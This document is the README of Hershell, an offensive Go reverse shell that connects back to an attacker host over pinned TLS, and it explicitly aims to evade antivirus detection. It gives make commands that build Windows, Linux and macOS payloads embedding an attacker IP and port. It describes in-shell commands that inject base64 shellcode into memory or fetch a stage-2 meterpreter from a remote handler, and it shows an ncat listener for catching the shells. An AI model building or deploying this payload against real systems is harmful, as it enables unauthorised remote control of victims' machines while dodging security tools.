# Hershell

Simple TCP reverse shell written in [Go](https://golang.org).

It uses TLS to secure the communications, and provide a certificate public key fingerprint pinning feature, preventing from traffic interception.

Supported OS are:

- Windows
- Linux
- Mac OS
- FreeBSD and derivatives

## Why ?

Although meterpreter payloads are great, they are sometimes spotted by AV products.

The goal of this project is to get a simple reverse shell, which can work on multiple systems.

## How ?

Since it's written in Go, you can cross compile the source for the desired architecture.

### Building the payload

To simplify things, you can use the provided Makefile.
You can set the following environment variables:

- ``GOOS`` : the target OS
- ``GOARCH`` : the target architecture
- ``LHOST`` : the attacker IP or domain name
- ``LPORT`` : the listener port

For the ``GOOS`` and ``GOARCH`` variables, you can get the allowed values [here](https://golang.org/doc/install/source#environment).

However, some helper targets are available in the ``Makefile``:

- ``depends`` : generate the server certificate (required for the reverse shell)
- ``windows32`` : builds a windows 32 bits executable (PE 32 bits)
- ``windows64`` : builds a windows 64 bits executable (PE 64 bits)
- ``linux32`` : builds a linux 32 bits executable (ELF 32 bits)
- ``linux64`` : builds a linux 64 bits executable (ELF 64 bits)
- ``macos`` : builds a mac os 64 bits executable (Mach-O)

For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment variables.

### Using the shell

Once executed, you will be provided with a remote shell.
This custom interactive shell will allow you to execute system commands through `cmd.exe` on Windows, or `/bin/sh` on UNIX machines.

The following special commands are supported:

* ``run_shell`` : drops you an system shell (allowing you, for example, to change directories)
* ``inject <base64 shellcode>`` : injects a shellcode (base64 encoded) in the same process memory, and executes it (Windows only at the moment).
* ``meterpreter IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp meterpreter from metasploit, and execute the shellcode in memory (Windows only at the moment)
* ``exit`` : exit gracefully

## Usage

First of all, you will need to generate a valid certificate:
```bash
$ make depends
openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
Generating a 4096 bit RSA private key
....................................................................................++
.....++
writing new private key to 'server.key'
-----
cat server.key >> server.pem
```

For windows:

```bash
# Custom target
$ make GOOS=windows GOARCH=amd64 LHOST=192.168.0.12 LPORT=1234
# Predifined target
$ make windows32 LHOST=192.168.0.12 LPORT=1234
```

For Linux:
```bash
# Custom target
$ make GOOS=linux GOARCH=amd64 LHOST=192.168.0.12 LPORT=1234
# Predifined target
$ make linux32 LHOST=192.168.0.12 LPORT=1234
```

For Mac OS X
```bash
$ make macos LHOST=192.168.0.12 LPORT=1234
```

## Listeners

One can use various tools to handle incomming connections, such as:

* socat
* ncat
* openssl server module
* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)

Here is an example with `ncat`:

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
```
